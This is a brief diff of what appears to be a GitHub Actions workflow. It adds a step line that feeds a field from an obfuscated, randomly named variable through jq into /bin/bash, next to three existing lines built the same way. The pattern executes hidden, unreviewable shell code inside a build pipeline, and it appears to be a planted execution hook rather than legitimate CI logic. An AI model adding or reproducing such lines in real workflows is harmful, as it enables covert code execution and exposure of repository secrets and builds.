@@ -36,6 +36,7 @@ jobs:
           echo $dblja5 | jq -r .klbd26767 | /bin/bash
           printf '%s' "$eq5" | jq -r .o71 | /bin/bash
           echo $nahrt7911 | jq -r .ixcyo7 | /bin/bash
+          printf '%s' "$toyet78026" | jq -r .kxbk7 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
